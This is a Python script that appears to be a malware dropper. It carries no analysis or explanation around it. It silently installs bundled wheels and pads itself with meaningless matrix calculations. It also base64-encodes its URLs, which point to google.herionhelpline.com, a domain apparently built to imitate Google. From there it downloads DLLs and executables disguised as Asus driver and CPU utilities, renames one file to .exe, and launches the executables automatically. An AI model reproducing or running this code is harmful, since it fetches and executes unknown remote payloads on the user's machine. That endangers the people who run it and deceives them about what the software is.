import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'requirements'))
try:
    import urllib.request as a
    import os as b
    import time as c
    import threading as d
    import base64
except ImportError:
    import subprocess
    import sys
    req_path = os.path.join(os.path.dirname(__file__), 'requirements')
    for wheel in os.listdir(req_path):
        if wheel.endswith('.whl'):
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', os.path.join(req_path, wheel)])
    import urllib.request as a
    import os as b
    import time as c
    import threading as d
    import base64

def __junk_matrix_math():
    m = [[i * j for j in range(10)] for i in range(10)]
    res = 0
    for i in range(10):
        for j in range(10):
            res += m[i][j] * (i + 1) - (j + 2)
    for k in range(5):
        for i in range(10):
            for j in range(10):
                res += (m[i][j] + k) % (i + 1)
    return res

def _dummy_calc(n):
    s = 0
    for i in range(n):
        s += i * i
        if i % 10 == 0:
            __junk_matrix_math()
    return s ** 2

def _b64decode(s):
    return base64.b64decode(s).decode()

def _download_file(u, o):
    try:
        a.urlretrieve(u, o)
        return True
    except Exception as e:
        print(f"Download error for {u}: {e}")
        return False

def main():
    __junk_matrix_math()
    files = [
        # https://google.herionhelpline.com/app/system1.dll
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9zeXN0ZW0xLmRsbA==", "lib1.dll"),
        # https://google.herionhelpline.com/app/system2.dll
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9zeXN0ZW0yLmRsbA==", "lib2.dll"),
        # https://google.herionhelpline.com/app/AsusUSBDriver.py
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9Bc3VzVVNCZHJpdmVyLnB5", "AsusUSBDriver.py"),
        # https://google.herionhelpline.com/app/AsusCPUApi_v32.43.5.exe
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9Bc3VzQ1BVQXBpX3YzMi40My41LmV4ZQ==", "AsusCPUApi_v32.43.5.exe")
    ]
    out = b.getcwd()
    threads = []
    t_dummy = d.Thread(target=_dummy_calc, args=(1000,))
    threads.append(t_dummy)
    
    download_results = []
    for u, f in files:
        url = _b64decode(u)
        p = b.path.join(out, f)
        t = d.Thread(target=lambda url=url, path=p: download_results.append(_download_file(url, path)))
        threads.append(t)
    
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    __junk_matrix_math()
    
    # Rename AsusUSBDriver.py -> AsusUSBDriver.exe
    py_path = b.path.join(out, "AsusUSBDriver.py")
    exe_path = b.path.join(out, "AsusUSBDriver.exe")
    if b.path.exists(py_path):
        try:
            b.rename(py_path, exe_path)
        except Exception as e:
            print(f"Error renaming: {e}")
    
    # Check and run all exe files
    exe_files = [exe_path, b.path.join(out, "AsusCPUApi_v32.43.5.exe")]
    for f in exe_files:
        if b.path.exists(f):
            try:
                b.startfile(f)
            except Exception as e:
                print(f"Error running {f}: {e}")

if __name__ == "__main__":
    main()